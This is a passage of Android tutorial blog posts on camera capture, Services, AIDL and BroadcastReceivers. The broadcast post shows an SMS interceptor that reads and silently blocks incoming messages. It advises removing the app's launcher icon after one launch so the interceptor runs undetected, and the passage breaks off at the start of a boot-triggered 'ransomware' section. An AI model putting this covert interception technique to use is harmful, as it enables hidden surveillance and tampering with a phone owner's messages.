            c = Camera.open(); // attempt to get a Camera instance
        }
        catch (Exception e){
            // Camera is not available (in use or does not exist)
        }
        return c; // returns null if camera is unavailable
    }

    private PictureCallback mPicture = new PictureCallback() {

        //摄像头照相方法执行时，会调用此方法
        @Override
        public void onPictureTaken(byte[] data, Camera camera) {

            //指定相片保存的路径和文件名
            File pictureFile = new File(&quot;sdcard/ohohoho2.jpg&quot;);

            try {
                FileOutputStream fos = new FileOutputStream(pictureFile);
                fos.write(data);
                fos.close();
            } catch (FileNotFoundException e) {
                Log.d(TAG, &quot;File not found: &quot; + e.getMessage());
            } catch (IOException e) {
                Log.d(TAG, &quot;Error accessing file: &quot; + e.getMessage());
            }
        }
    };
}
</code></pre><ul>
<li><p>2.设置摄像头预览类CameraPreview</p>
<p>/<em>* 摄像头预览类 </em>/</p>
<pre><code>public class CameraPreview extends SurfaceView implements SurfaceHolder.Callback {
    private static final String TAG = &quot;Camera&quot;;
    private SurfaceHolder mHolder;
    private Camera mCamera;

    @SuppressWarnings(&quot;deprecation&quot;)
    public CameraPreview(Context context, Camera camera) {
        super(context);
        mCamera = camera;

        // Install a SurfaceHolder.Callback so we get notified when the
        // underlying surface is created and destroyed.
        // 获取SurfaceView的holder
        mHolder = getHolder();
        // 设置侦听，侦听SurfaceView的摧毁和创建
        mHolder.addCallback(this);
        // 3.0之后，会自动设置
        mHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
    }

    public void surfaceCreated(SurfaceHolder holder) {
        // The Surface has been created, now tell the camera where to draw the preview.
        try {
            //指定摄像头的预览界面显示在哪个SurfaceView中
            mCamera.setPreviewDisplay(holder);
            //开始预览
            mCamera.startPreview();
        } catch (IOException e) {
            Log.d(TAG, &quot;Error setting camera preview: &quot; + e.getMessage());
        }
    }

    public void surfaceDestroyed(SurfaceHolder holder) {
        // empty. Take care of releasing the Camera preview in your activity.
    }

    public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) {
        // If your preview can change or rotate, take care of those events here.
        // Make sure to stop the preview before resizing or reformatting it.

        if (mHolder.getSurface() == null){
          // preview surface does not exist
          return;
        }

        // stop preview before making changes
        try {
            mCamera.stopPreview();
        } catch (Exception e){
          // ignore: tried to stop a non-existent preview
        }

        // set preview size and make any resize, rotate or
        // reformatting changes here

        // start preview with new settings
        try {
            mCamera.setPreviewDisplay(mHolder);
            mCamera.startPreview();

        } catch (Exception e){
            Log.d(TAG, &quot;Error starting camera preview: &quot; + e.getMessage());
        }
    }
}
</code></pre></li>
<li><p>3.设置清单文件</p>
</li>
</ul>
<pre><code>&lt;uses-permission android:name=&quot;android.permission.CAMERA&quot; /&gt;
  &lt;uses-feature android:name=&quot;android.hardware.camera&quot; /&gt;
  &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;
</code></pre><ul>
<li>4.布局文件</li>
</ul>
<p>  &lt;?xml version=”1.0” encoding=”utf-8”?&gt;<br>        <linearlayout xmlns:android="http://schemas.android.com/apk/res/android" android:orientation="horizontal" android:layout_width="fill_parent" android:layout_height="fill_parent"><br>          <framelayout android:id="@+id/camera_preview" android:layout_width="fill_parent" android:layout_height="fill_parent" android:layout_weight="1"></framelayout></linearlayout></p>
<pre><code>  &lt;Button
    android:id=&quot;@+id/button_capture&quot;
    android:text=&quot;拍照&quot;
    android:layout_width=&quot;wrap_content&quot;
    android:layout_height=&quot;wrap_content&quot;
    android:layout_gravity=&quot;center&quot;
    /&gt;
&lt;/LinearLayout&gt;
</code></pre>
          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/13/08-服务-Service/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/02/13/08-服务-Service/" itemprop="url">
                  08 服务 Service
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T09:45:31+08:00">
                2017-02-13
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#服务两种启动方式</p>
<ul>
<li>startService 开始服务<ul>
<li>开始服务，会使进程变成为服务进程</li>
<li>直接开启服务，服务一旦启动跟调用者（开启者没有任何关系）</li>
<li>启动服务的activity和服务不再有一毛钱关系</li>
<li>调用者activity退出了，服务还是继续运行活的好好的。</li>
<li>调用者activity，没法访问服务里面的方法。</li>
</ul>
</li>
<li>bindService 绑定服务<ul>
<li>绑定服务不会使进程变成服务进程</li>
<li>绑定开启服务，服务和开启者（调用者）有密切的关系。</li>
<li>绑定服务，是activity与服务建立连接，如果activity销毁了，服务也会被解绑并销毁，但是如果服务被销毁，activity不会被销毁</li>
<li>不求同时生，但求同时死。只要activity挂了，服务跟着挂了。</li>
<li>调用者activity，可以调用服务里面的方法。</li>
</ul>
</li>
</ul>
<p>###绑定服务的生命周期  </p>
<ul>
<li>绑定服务和解绑服务的生命周期方法：onCreate-&gt;onBind-&gt;onUnbind-&gt;onDestroy</li>
<li>不会调用onstart()方法 和 onstartCommand()方法。</li>
</ul>
<p>###绑定方式开启服务，调用服务方法的流程 （重要）eg:day08音乐播放器</p>
<ol>
<li>使用bindService绑定服务的方式开启服务。  <ul>
<li>bindService(intent, new MyConn(), Context.BIND_AUTO_CREATE);   </li>
<li>参数1：绑定的意图，绑定那个服务</li>
<li>参数2:ServiceConnection对象，通讯频道(中间人的联系渠道，能找到中间人)</li>
<li>参数3：绑定方式，自动创建服务(绑定时，如果该服务不存在，自动创建该服务)</li>
</ul>
</li>
</ol>
<p>public class MainActivity extends Activity {<br>                PublicBusiness zms;//定义接口：抽取服务中的方法<br>                Intent intent;//定义意图：绑定那个服务<br>                private MyConnection conn;//定义通讯频道（UI页面与服务的连接对象），可通过通讯频道获取中间人<br>                @Override<br>                protected void onCreate(Bundle savedInstanceState) {<br>                    super.onCreate(savedInstanceState);<br>                    setContentView(R.layout.activity_main);<br>                    intent = new Intent(this, BaoService.class);<br>                    conn = new MyConnection();<br>                      //绑定服务<br>                    bindService(intent, conn, BIND_AUTO_CREATE);<br>                }<br>            }</p>
<ol>
<li>创建一个MyConnection类 实现服务与activity的通讯频道(UI页面和服务中间人的联系渠道)能找到中间人。返回的中间人转成接口对象类型<blockquote>
<p>为什么要设置中间人？<br>因为UI界面要操作服务里的方法，服务对象去调方法，而服务对象不能被new出来，所以需要在服务中创建中间人内部类，通过中间人对象调用自己类中方法，来调用服务里的方法，而服务又将中间人返给UI界面，这样UI界面就能通过中间人来操作服务里的方法了</p>
</blockquote>
</li>
</ol>
<p>Activity中<br> class MyConnection implements ServiceConnection{<br>      //服务连接建立时，此方法调用。绑定服务，其实就是连接到服务，得到中间人。onBind有返回值才会调用<br>      @Override<br>      public void onServiceConnected(ComponentName name, IBinder service) {<br>      zms = (PublicBusiness) service;<br>      }</p>
<pre><code>//失去服务连接时调用。当服务突然异常终止的时候
@Override
public void onServiceDisconnected(ComponentName name) {

}
</code></pre><p> }</p>
<ol>
<li>服务成功绑定的时候 会执行onBinde方法，返回中间人，<ul>
<li>中间人中定义了许多方法，可以通过这些方法去调用服务里的方法。</li>
<li>我们只需要在UI界面Activity中得到中间人，并调用中间人的方法，就间接调用了服务的方法         </li>
</ul>
</li>
</ol>
<p>public class BaoService extends Service {</p>
<pre><code>    //服务成功绑定的时候 会执行onBinde方法，返回中间人
    @Override
    public IBinder onBind(Intent intent) {
        return new ZhongMiShu();
    }

    //定义中间人的类，将其私有，只对其他应用提供接口里的方法，通过onBinde方法返回中间人
    private class ZhongMiShu extends Binder implements PublicBusiness{

        //内部人员实现接口的方法帮助我们去调用服务的方法。
        @Override
        public void qianXian(){
            //调用服务里的方法
            banZheng();
        }
        //这些方法外部不能调用，因为ZhongMiShu中间人类是私有的。
        public void playMajiang(){
            System.out.println(&quot;一起打麻将&quot;);
        }

        //这些方法外部不能调用，因为ZhongMiShu中间人类是私有的。
        public void xisangna(){
            System.out.println(&quot;一起洗桑拿&quot;);
        }
    }
}
</code></pre><ol>
<li>在调用者UI界面 activity代码里面通过中间人调用服务的方法。<ul>
<li>中间人调用在自己类中定义的方法，再通过自己的方法去调用服务里的方法</li>
</ul>
</li>
</ol>
<p>Activity中<br> //PublicBusiness zms;//Activity中获取接口：接口中抽取中间人对外提供的方法<br> //服务连接建立时，此方法调用。绑定服务，其实就是连接到服务，得到中间人。<br> //点击事件：调用中间人实现接口的方法，<br>  public void click(View v){<br>       zms.qianXian();<br>  }</p>
<ol>
<li>解除绑定服务 unbindService(conn)。</li>
</ol>
<p> //点击事件：解除服务<br>        public void unbind(View v){<br>            //解绑服务<br>            unbindService(conn);<br>        }</p>
<p>####抽取接口，隐藏私有方法。（这种方式经典，封装的思想，隐藏内部，暴露接口） </p>
<blockquote>
<p>参考视频</p>
</blockquote>
<hr>
<p>#找领导办证</p>
<ul>
<li>把服务看成一个领导，服务中有一个banZheng方法，如何才能访问？</li>
<li>绑定服务时，会触发服务的onBind方法，此方法会返回一个Ibinder的对象给MainActivity，通过这个对象访问服务中的方法</li>
<li>绑定服务</li>
</ul>
<p> Intent intent = new Intent(this, BanZhengService.class);<br> bindService(intent, conn, BIND_AUTO_CREATE);</p>
<ul>
<li>绑定服务时要求传入一个ServiceConnection实现类的对象</li>
<li>定义这个实现类</li>
</ul>
<p>class MyServiceconn implements ServiceConnection{<br>        @Override<br>        public void onServiceConnected(ComponentName name, IBinder service) {<br>            zjr = (PublicBusiness) service;<br>        }<br>        @Override<br>        public void onServiceDisconnected(ComponentName name) {<br>        }<br>    }</p>
<ul>
<li><p>创建实现类对象<br>conn = new MyServiceconn();</p>
</li>
<li><p>在服务中定义一个类实现Ibinder接口，以在onBind方法中返回</p>
</li>
</ul>
<p>服务中 创建中间人对象,需继承Binder(另外将中间人要实现的方法进行抽取成接口PublicBusiness)<br> class ZhongJianRen extends Binder implements PublicBusiness{<br>        public void QianXian(){<br>            //访问服务中的banZheng方法<br>            BanZheng();<br>        }<br>        public void daMaJiang(){</p>
<pre><code>    }
}
</code></pre><ul>
<li>把QianXian方法抽取到接口PublicBusiness中定义</li>
</ul>
<hr>
<p>#两种启动方法混合使用</p>
<ul>
<li>用服务实现音乐播放时，因为音乐播放必须运行在服务进程中，可是音乐服务中的方法，需要被前台Activity所调用，所以需要混合启动音乐服务</li>
<li>先start，再bind，销毁时先unbind，在stop</li>
</ul>
<hr>
<p>##使用服务注册广播接收者</p>
<ul>
<li>Android四大组件都要在清单文件中注册</li>
<li>广播接收者可以使用清单文件注册<ul>
<li>一旦应用部署，广播接收者就生效了，直到用户手动停止应用或者应用被删除</li>
</ul>
</li>
<li>广播接收者可以使用代码注册<ul>
<li>需要广播接收者运行时，使用代码注册，不需要时，可以使用代码解除注册</li>
</ul>
</li>
<li>电量改变、屏幕开关，必须使用代码注册</li>
</ul>
<p>1定义java类继承BroadcastReceiver(重写onReceive方法)<br>public class ScreenReceiver extends BroadcastReceiver {<br>    @Override<br>    public void onReceive(Context context, Intent intent) {<br>        String action = intent.getAction();<br>        if(Intent.ACTION_SCREEN_OFF.equals(action)){<br>//            Toast.makeText(context, “关闭”, 0).show();<br>            System.out.println(“关闭”);<br>        }<br>        else if(Intent.ACTION_SCREEN_ON.equals(action)){<br>//            Toast.makeText(context, “开启”, 0).show();<br>            System.out.println(“开启”);<br>        }<br>    }<br>}<br>2 服务注册广播接收者(使用代码注册接收什么样的广播:屏幕开关广播)<br>        /**</p>
<pre><code> * 此RegisterService服务用于屏幕开关广播接收者的注册
 * @author Administrator
 *
 */
public class RegisterService extends Service {

    private ScreenReceiver receiver;//定义屏幕开关广播接收者对象

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        //创建广播接收者对象
        receiver = new ScreenReceiver();
        //通过IntentFilter对象指定广播接收者接收什么类型的广播
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_SCREEN_ON);

        //注册广播接收者
        registerReceiver(receiver, filter);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        //解除注册
        unregisterReceiver(receiver);
    }
}
</code></pre><ul>
<li><p>解除注册广播接收者<br>unregisterReceiver(receiver);</p>
</li>
<li><p>解除注册之后，广播接收者将失去作用</p>
</li>
</ul>
<p>3 只需要在UI界面，开启此RegisterService服务，就表示屏幕开关广播接收者在清单中进行了配置<br>//点击事件：开启服务<br>public void click1(View v){<br>      intent = new Intent(this, RegisterService.class);<br>      startService(intent);<br>}</p>
<ul>
<li>4在UI界面，停止了此RegisterService服务，就表示不在接收屏幕开关时系统发出的广播<br>//点击事件：停止RegisterService服务<br>public void click2(View v){<pre><code>//1.创建意图
Intent intent = new Intent(this,RegisterService.class);
//2.停止服务
stopService(intent);
</code></pre>}</li>
</ul>
<p>##本地服务：服务和启动它的组件在同一个进程</p>
<p>##远程服务：服务和启动它的组件不在同一个进程</p>
<ul>
<li><p>1、服务和启动它的组件不在同一个进程时，远程服务要先在清单中进行配置配置，类似隐式启动Activity，在清单文件中配置Service标签时，必须配置intent-filter子节点，并指定action子节点</p>
<pre><code>&lt;service android:name=&quot;com.itheima.baopay.PayService&quot;&gt;
    &lt;intent-filter &gt;
        &lt;action android:name=&quot;com.itheima.baopay&quot;/&gt;
    &lt;/intent-filter&gt;
&lt;/service&gt;
</code></pre></li>
<li>2、服务和启动它的组件不在同一个进程时，调用者Activity界面启动远程服务时只能隐式启动，同样绑定远程服务，需要隐式绑定远程服务，绑定时第二个参数直接new,得到的接口对象需要用 pb = Stub.asInterface(service)转换类型。</li>
<li><p>2.1、隐式启动远程服务</p>
<pre><code>//点击事件：启动远程服务
public void click1(View v)
{
    //隐式启动远程服务
    Intent intent = new Intent();
    intent.setAction(&quot;com.itheima.service&quot;);
    startService(intent);
}
</code></pre></li>
<li><p>2.2、隐式绑定远程服务（绑定服务，就为了操作服务中的方法）隐式绑定远程服务的第二个参数最好直接new MyConnection(),不要创建通讯频道对象传入对象。</p>
<pre><code>//点击事件：绑定远程服务
public void click2(View v)
{
    Intent intent = new Intent();
    intent.setAction(&quot;com.itheima.service&quot;);
    bindService(intent, new MyConnection(), BIND_AUTO_CREATE);
}
// 创建一个MyConnection类,能找到中间人
class MyConnection implements ServiceConnection{

    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        // 强转成publicbusiness
        pb = Stub.asInterface(service);
    }

    @Override
    public void onServiceDisconnected(ComponentName name) {

    }
}
</code></pre></li>
<li>2.3 注意：<ul>
<li>服务和启动它的组件不在同一个进程时，UI界面获取的中间人，与服务返回的中间人不一致。</li>
<li>需要新技术让UI界面获取的中间人，和服务返回的中间人一致。用到AIDL。</li>
</ul>
</li>
<li><p>3 使用得到的接口对象调用服务内部方法</p>
<pre><code>//点击事件：调用远程服务的方法
public void click(View v){
    try {
        pb.banzheng();
    } catch (RemoteException e) {
        e.printStackTrace();
    }
}
</code></pre><p>#AIDL</p>
</li>
<li>Android interface definition language</li>
<li>安卓接口定义语言</li>
<li>作用：跨进程通信</li>
<li>应用场景：远程服务中的中间人对象，其他应用是拿不到的，那么在通过绑定服务获取中间人对象时，就无法强制转换，使用aidl，就可以在其他应用中拿到中间人类所实现的接口<br>###AIDL实现步骤<br>#####对远程服务项目的操作</li>
</ul>
<ol>
<li>把接口的后缀名改成aidl</li>
<li>把aidl中的public删掉</li>
<li>让中间人类直接继承stub<br>#####对访问者项目的操作</li>
<li>把远程服务项目的aidl复制到本项目中</li>
<li>aidl文件所在的包，必须与远程服务项目中aidl所在的包一致</li>
<li><p>使用stub的asInterface方法强转中间人对象</p>
<pre><code>// 创建一个MyConnection类,能找到中间人
class MyConnection implements ServiceConnection{

    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        // 强转成publicbusiness
        pb = Stub.asInterface(service);
    }

    @Override
    public void onServiceDisconnected(ComponentName name) {

    }
}
</code></pre><p>###远程服务步骤示例<br> /**</p>
<ul>
<li>创建远程MyService服务：用于提供办证服务</li>
<li>1、先创建一个PublicBusiness接口，封装MyService服务能够对外提供的内部方法。</li>
<li>2、在MyService服务中创建中间人类继承Binder类实现PublicBusiness接口</li>
<li>3、中间人实现接口里的方法去调用MyService服务里的方法。</li>
<li>4、将中间人返回调用者Activity。</li>
<li><p>5、在清单中注册该MyService服务</p>
</li>
<li><ol>
<li>把接口的后缀名改成aidl</li>
</ol>
</li>
<li><ol>
<li>把aidl中的public删掉</li>
</ol>
</li>
<li><ol>
<li>让中间人类直接继承stub</li>
</ol>
</li>
<li><p>@author Administrator<br><em>
</em>/<br>###启动远程服务步骤示例<br>/**</p>
<ul>
<li>此Activity用于调用远程服务里的方法</li>
<li>1、绑定远程服务(隐式启动远程服务),绑定时第二个参数直接new,</li>
<li>2、创建通信渠道类，得到中间人.得到的接口对象需要用 pb = Stub.asInterface(service)转换类型。</li>
<li>3、通过中间人调用远程服务的方法</li>
<li>@author Administrator<br><em>
</em>/</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>##支付宝远程服务</p>
<ol>
<li>定义支付宝的服务，在服务中定义pay方法</li>
<li>定义中间人对象，把pay方法抽取成接口</li>
<li>把抽取出来的接口后缀名改成aidl</li>
<li>中间人对象直接继承Stub对象</li>
<li>注册这个支付宝服务，定义它的intent-Filter</li>
</ol>
<p>##需要支付的应用</p>
<ol>
<li>把刚才定义好的aidl文件拷贝过来，注意aidl文件所在的包名必须跟原包名一致</li>
<li>远程绑定支付宝的服务，通过onServiceConnected方法我们可以拿到中间人对象</li>
<li>把中间人对象通过Stub.asInterface方法强转成定义了pay方法的接口</li>
<li>调用中间人的pay方法</li>
</ol>
<p>##五种前台进程</p>
<ol>
<li>此进程activity执行了onresume方法，获得焦点</li>
<li>此进程拥有一个跟正在与用户交互的activity绑定的服务</li>
<li>此进程拥有一个服务执行了startForeground()方法？？？？</li>
<li>此进程拥有一个正在执行onCreate()、onStart()或者onDestroy()方法中的任意一个的服务</li>
<li>此进程拥有一个正在执行onReceive方法的广播接收者？？？？</li>
</ol>
<p>##两种可见进程</p>
<ol>
<li>activity执行了onPause方法，失去焦点，但是可见</li>
<li>拥有一个跟可见或前台activity绑定的服务</li>
</ol>
<p>#国际化 I18N</p>
<ul>
<li>Android国际化还是比较方便，一般情况下写代码是不允许直接把文本直接写在代码里，都要使用Strings。       </li>
<li>代码的提示文本也需要放在资源文件目录下       </li>
<li>string.xml 放在对应的文件夹   <ul>
<li>values-en-rGB<ul>
<li>string.xml</li>
</ul>
</li>
<li>values-en-rUS      <ul>
<li>string.xml   </li>
</ul>
</li>
</ul>
</li>
<li>drawable   放在对应的文件夹 <ul>
<li>rawable-en-rGB</li>
<li>drawable-en-rUS   </li>
</ul>
</li>
<li>文件夹的名称 参考  IE      </li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/13/07-广播-BroadcastReceiver/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/02/13/07-广播-BroadcastReceiver/" itemprop="url">
                  07 广播 BroadcastReceiver
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T09:45:06+08:00">
                2017-02-13
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#广播</p>
<ul>
<li>广播的概念<ul>
<li>现实：电台通过发送广播发布消息，买个收音机，就能收听<ul>
<li>电台基站（官方，非官方）  –&gt;广播信号</li>
<li>收音机                  –&gt;接受信号</li>
</ul>
</li>
<li>Android：系统在产生某个事件时发送广播，应用程序使用广播接收者接收这个广播，就知道系统产生了什么事件。</li>
</ul>
</li>
</ul>
<p>##android下广播机制设计的目的</p>
<ul>
<li><p>手机里面Android系统在运行的过程中会有很多事件。</p>
<ul>
<li>手机电量不足</li>
<li>手机开机</li>
<li>有人给你发送了短信</li>
<li>你向外拨打了电话</li>
<li>手机启动完毕</li>
<li>屏幕解锁</li>
</ul>
</li>
<li><p>google的android系统把常用的事件，做成了广播机制。一旦事件产生了，就向全系统发送一个广播消息。应用程序使用广播接收者接收这个广播，就知道系统产生了什么事件。</p>
</li>
</ul>
<p>####如何使用内置的广播接受者       </p>
<p>####(创建类似于Activity,四大组件都如此,先.继承一个类 后.配置一个清单)</p>
<ol>
<li>创建一个类继承 BroadcastReceiver （类似买了收音机）</li>
<li><p>在清单中配置广播接受者（装上电池，配好频道）</p>
<pre><code>&lt;receiver android:name=&quot;com.itheima.ipdail.IpDailBroadcastReceiver&quot;&gt;
    &lt;intent-filter &gt;
        &lt;action android:name=&quot;android.intent.action.NEW_OUTGOING_CALL&quot;/&gt;
    &lt;/intent-filter&gt;
&lt;/receiver&gt;
</code></pre></li>
<li>特殊的广播接受者，需要添加权限(如：开机自启动权限)。</li>
<li>重写BroadcastReceiver类的onReceive(Context context, Intent intent)方法。</li>
<li><p>通过intent拿到数据，并可以进行修改</p>
<p> public class CallReceiver extends BroadcastReceiver{</p>
<pre><code>//当收到广播时，此方法调用
@Override
public void onReceive(Context context, Intent intent) {
    //添加ip线路
    //1.拿到用户拨打的号码，修改号码添加ip线路
    String number = getResultData();
    number = &quot;17951&quot; + number;

    //2.把新号码设置进广播中
    setResultData(number);

    //此代码无效，因为打电话应用的广播接收者是最终接收者
    //abortBroadcast();//阻止其他广播接收者接收这条广播，可以理解为拦截广播
}
</code></pre><p> }</p>
</li>
</ol>
<hr>
<p>#广播接收者</p>
<ul>
<li>广播发出时，会先自己定义意图过滤器action和数据data(有时只定义意图过滤器action),发出广播后，被广播接收者接收。</li>
<li>当一条广播被发送出来时，系统会在所有清单文件中遍历(遍历所有，哪怕找到了，也还要继续遍历，直到把所有清单文件遍历一遍)，通过匹配意图过滤器找到能接收这条广播的广播接收者</li>
<li>广播接收者一旦接收到了广播，就开始执行广播接受者里面的代码，若没有接收到匹配的广播，代码就不会执行</li>
</ul>
<p>###一些常量</p>
<pre><code>android.intent.action.NEW_OUTGOING_CALL:外拨电话
android.intent.action.PACKAGEADDED：应用被安装
android.intent.action.PACKAGEREMOVED：应用被移除
android.intent.action.PACKAGE_REPLACED：应用被替换
android.intent.action.MEDIAMOUNTED：sd卡被装载了
android.intent.action.MEDIAREMOVED：sd卡被移除了
android.intent.action.MEDIA_UNMOUNTED：sd卡未挂载
android.intent.action.BOOTCOMPLETED：一旦设备完成启动时触发。需要RECEIVE_BOOT_COMPLETED权限。
Mount：安装，登上
Boot：引导程序，启动，引导
</code></pre><p>##不同android版本的安全升级</p>
<ul>
<li><p>2.3以及2.3一下的版本，任何广播接受者apk只要被装到手机就立刻生效。不管应用程序进程是否运行。</p>
</li>
<li><p>4.0以及4.0以上的版本，要求应用程序必须有ui界面（activity） 广播接受者才能生效，如果用户点击了强行停止，应用程序就完全关闭了，广播接受者就失效了。如果用户没有点击过强行停止，即使应用程序进程不存在，也会自动的运行起来。</p>
</li>
</ul>
<hr>
<p>#IP拨号器</p>
<blockquote>
<p>原理：接收拨打电话的广播，修改广播内携带的电话号码</p>
<ul>
<li>定义广播接收者接收打电话广播</li>
</ul>
</blockquote>
<pre><code>public class CallReceiver extends BroadcastReceiver {

    //当广播接收者接收到广播时，此方法会调用
    @Override
    public void onReceive(Context context, Intent intent) {
        //拿到用户拨打的号码
        String number = getResultData();
        //修改广播内的号码，//同时把新号码设置进广播中
        setResultData(&quot;17951&quot; + number);
    }
}
</code></pre><ul>
<li><p>在清单文件中定义该广播接收者接收的广播类型</p>
<pre><code>&lt;receiver android:name=&quot;com.itheima.ipdialer.CallReceiver&quot;&gt;
    &lt;intent-filter &gt;
        &lt;action android:name=&quot;android.intent.action.NEW_OUTGOING_CALL&quot;/&gt;
    &lt;/intent-filter&gt;
&lt;/receiver&gt;
</code></pre></li>
<li><p>接收打电话广播需要权限</p>
<pre><code>&lt;uses-permission android:name=&quot;android.permission.PROCESS_OUTGOING_CALLS&quot;/&gt;
</code></pre></li>
<li>即使广播接收者的进程没有启动，当系统发送的广播可以被该接收者接收时，系统会自动启动该接收者所在的进程</li>
</ul>
<hr>
<p>#短信拦截器</p>
<blockquote>
<p>系统收到短信时会产生一条广播，广播中包含了短信的号码和内容</p>
</blockquote>
<ul>
<li><p>1.定义广播接收者接收短信广播</p>
<pre><code>public class SmsReceiver extends BroadcastReceiver {

    //intent:此对象就是广播中包含的那个intent
    @Override
    public void onReceive(Context context, Intent intent) {
        //从广播中取出短信的内容
        Bundle bundle = intent.getExtras();
        //数组中的每个元素，就是一条短信
        Object[] objects = (Object[]) bundle.get(&quot;pdus&quot;);

        for (Object object : objects) {
            //把object转换成短信对象
            SmsMessage sms = SmsMessage.createFromPdu((byte[])object);
            //获取短信发送者的号码
            String address = sms.getOriginatingAddress();
            //获取短信的内容
            String body = sms.getMessageBody();

            if(address.equals(&quot;138438&quot;)){
                //阻止其他广播接收者接收这条广播，可以理解为拦截广播
                abortBroadcast();
            }
            System.out.println(address + &quot;:&quot; + body);
        }
    }
}
</code></pre></li>
<li>要理解：系统创建广播时，把短信存放到一个数组，然后把数据以pdus为key存入bundle，再把bundle存入intent</li>
<li><p>2.清单文件中配置广播接收者接收的广播类型，注意要设置优先级属性，要保证优先级高于短信应用，才可以实现拦截</p>
<pre><code>&lt;receiver android:name=&quot;com.itheima.smslistener.SmsReceiver&quot;&gt;
    &lt;intent-filter android:priority=&quot;1000&quot;&gt;
        &lt;action android:name=&quot;android.provider.Telephony.SMS_RECEIVED&quot;/&gt;
    &lt;/intent-filter&gt;
&lt;/receiver&gt;
</code></pre></li>
<li><p>3.添加权限</p>
<pre><code>&lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot;/&gt;
</code></pre></li>
<li><p>4.0之后，广播接收者所在的应用必须启动过一次，才能生效，第一次部署进手机时，要保留activity入口，让该应用执行一次，短信拦截器就运行在手机里，之后删除activity入口(就是删除快捷图标)这视为更新，神不知鬼不觉，拦截器就运行在手机里了。</p>
</li>
<li>4.0之后，如果广播接收者所在应用被用户手动关闭了，那么再也不会启动了，直到用户再次手动启动该应用</li>
</ul>
<hr>
<p>#监听SD卡状态</p>
<ul>
<li>清单文件中定义广播接收者接收的类型，监听SD卡常见的三种状态，所以广播接收者需要接收三种广播<pre><code>&lt;receiver android:name=&quot;com.itheima.listensd.SDStatusReceiver&quot;&gt;
    &lt;intent-filter &gt;
        &lt;action android:name=&quot;android.intent.action.MEDIA_MOUNTED&quot;/&gt;
        &lt;action android:name=&quot;android.intent.action.MEDIA_UNMOUNTED&quot;/&gt;
        &lt;action android:name=&quot;android.intent.action.MEDIA_REMOVED&quot;/&gt;
        &lt;data android:scheme=&quot;file&quot;/&gt;
    &lt;/intent-filter&gt;
&lt;/receiver&gt;
</code></pre></li>
<li><p>广播接收者的定义    </p>
<pre><code>/**
  * 此广播接收者用于监听SD卡状态
  * 吐司提示SD卡的状态
  * @author Administrator
  *
  */
 public class SDStatusReceiver extends BroadcastReceiver {

     @Override
     public void onReceive(Context context, Intent intent) {

         //判断收到的是什么广播
         String action = intent.getAction();

         if (intent.ACTION_MEDIA_MOUNTED.equals(action)) {
             Toast.makeText(context, &quot;SD卡可用&quot;, 0).show();
         } else if(intent.ACTION_MEDIA_UNMOUNTED.equals(action)){
             Toast.makeText(context, &quot;SD卡不可用&quot;, 0).show();
         }else if(intent.ACTION_MEDIA_REMOVED.equals(action)){
             Toast.makeText(context, &quot;SD卡被移除&quot;, 0).show();
         }

     }

 }
</code></pre></li>
</ul>
<hr>
<p>#勒索软件</p>
<ul>
<li><p>1.定义广播接收者</p>
<pre><code>/**
 * 此广播接收器用于开机启动勒索软件
 * @author Administrator
 *
 */
public class BootReceiver extends BroadcastReceiver {

    @Override
